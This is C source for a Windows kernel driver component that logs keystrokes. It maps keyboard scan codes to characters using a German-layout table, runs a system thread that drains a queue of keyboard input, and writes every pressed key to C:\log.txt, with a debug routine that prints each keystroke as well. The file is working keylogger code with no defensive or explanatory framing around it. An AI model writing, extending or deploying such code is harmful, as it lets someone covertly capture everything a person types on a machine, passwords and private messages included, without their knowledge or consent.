#include "log.h"
#include "debug.h"
#include "dispatch.h"
#include <ntstrsafe.h>

// Scan code to ascii lookup array
// Currently a mess and for german keyboard layouts.
static const char scanToAscii[0x80] = {
	0,  0x1B, // ESC
	'1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'ß', '´', '\b',
	 '\t', 'q', 'w', 'e', 'r', 't', 'z', 'u', 'i', 'o', 'p', 'ü', '+', '\n', 0, // CTRL
	'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '^',  0, 
	'#', 'y', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '-',
	0,
	0, // LSHIFT
	0, // ALT
	' ',
	0,  /* Caps lock */
	0,  /* 59 - F1 key ... > */
	0,   0,   0,   0,   0,   0,   0,   0,
	0,  /* < ... F10 */
	0,  /* 69 - Num lock*/
	0,  /* Scroll Lock */
	0,  /* Home key */
	0,  /* Up Arrow */
	0,  /* Page Up */
  '-',
	0,  /* Left Arrow */
	0,
	0,  /* Right Arrow */
  '+',
	0,  /* 79 - End key*/
	0,  /* Down Arrow */
	0,  /* Page Down */
	0,  /* Insert Key */
	0,  /* Delete Key */
	0,   0,   0,
	0,  /* F11 Key */
	0,  /* F12 Key */
	0,  /* All other keys are undefined */
};


NTSTATUS startLogThread(PDRIVER_OBJECT pDriverObject) {
	HANDLE hLogThread = NULL;
	OBJECT_ATTRIBUTES threadAttributes = { 0 };
	InitializeObjectAttributes(&threadAttributes, NULL, 0, NULL, NULL);
	const NTSTATUS ntStatus = IoCreateSystemThread(pDriverObject, &hLogThread, DELETE | SYNCHRONIZE, &threadAttributes, NULL, NULL, logStartRoutine, NULL);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("startLogThread: IoCreateSystemThread failed: 0x%lx\n", ntStatus);
	}

	return ntStatus;
}


BlockingQueue kbdInputQueue;

void logStartRoutine(PVOID pStartContext) {
	UNREFERENCED_PARAMETER(pStartContext);

	HANDLE hLogFile = NULL;
	UNICODE_STRING logFileName = RTL_CONSTANT_STRING(L"\\DosDevices\\C:\\log.txt");
	OBJECT_ATTRIBUTES fileAttributes;
	InitializeObjectAttributes(&fileAttributes, &logFileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	IO_STATUS_BLOCK ioStatusBlock = { 0 };
	NTSTATUS ntStatus = ZwCreateFile(&hLogFile, FILE_WRITE_DATA, &fileAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("logThread: ZwCreateFile failed: 0x%lx\n", ntStatus);

		return;
	}

	// write to file while queue is not empty and waiting
	while (kbdInputQueue.isWaiting || kbdInputQueue.size) {
		LIST_ENTRY* pListEntry = NULL;
		ntStatus = removeFromBlockingQueue(&kbdInputQueue, &pListEntry);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("logKbd: removeBlockingQueue failed: 0x%lx\n", ntStatus);

			continue;
		}

		KbdListData* const pKbdListData = CONTAINING_RECORD(pListEntry, KbdListData, list);
		ntStatus = logKbdToFile(&pKbdListData->data, hLogFile);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("logKbd: logKbdToFile failed: 0x%lx\n", ntStatus);

			continue;
		}

		ExFreePoolWithTag(pKbdListData, 'KBLI');
	}

	ntStatus = ZwClose(hLogFile);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("logKbd: ZwClose failed: 0x%lx\n", ntStatus);
	}

	return;
}


void logKbdToDbg(PKEYBOARD_INPUT_DATA pKbdInputData) {
	DBG_PRINT("++++++++++++\n");

	if (!pKbdInputData) {
		DBG_PRINT("logKbdToDbg: No data\n");

		return;
	}

	DBG_PRINTF("logKbdToDbg: MakeCode: %hu\n", pKbdInputData->MakeCode);

	if (pKbdInputData->Flags & KEY_BREAK) {
		DBG_PRINT("logKbdToDbg: Flag: KEY_BREAK\n");
	}
	else {
		DBG_PRINT("logKbdToDbg: Flag: KEY_MAKE\n");
	}

	if (pKbdInputData->Flags & KEY_E0) {
		DBG_PRINT("logKbdToDbg: Flag: KEY_E0\n");
	}

	if (pKbdInputData->Flags & KEY_E1) {
		DBG_PRINT("logKbdToDbg: Flag: KEY_E1\n");
	}

	const char ascii = scanToAscii[pKbdInputData->MakeCode];

	if (ascii) {
		DBG_PRINTF("logKbdToDbg: ASCII char: %c\n", ascii);
	}

	DBG_PRINT("++++++++++++\n");

	return;
}


NTSTATUS logKbdToFile(PKEYBOARD_INPUT_DATA pKbdInputData, HANDLE hFile) {
	NTSTATUS ntStatus = STATUS_SUCCESS;

	if (!(pKbdInputData->Flags & KEY_BREAK)) {
		const char key = scanToAscii[pKbdInputData->MakeCode];

		char buffer[0x8] = { 0 };
		ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%c", key);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("logKbd: RtlStringCbPrintfA failed: 0x%lx\n", ntStatus);

			return ntStatus;
		}

		size_t strLen = 0;
		ntStatus = RtlStringCbLengthA(buffer, sizeof(buffer), &strLen);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("logKbd: RtlStringCbLengthA failed: 0x%lx\n", ntStatus);

			return ntStatus;
		}

		IO_STATUS_BLOCK ioStatusBlock = { 0 };
		ntStatus = ZwWriteFile(hFile, NULL, NULL, NULL, &ioStatusBlock, buffer, (ULONG)strLen, NULL, NULL);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("logKbd: ZwWriteFile failed: 0x%lx\n", ntStatus);

			return ntStatus;
		}

	}

	return ntStatus;
}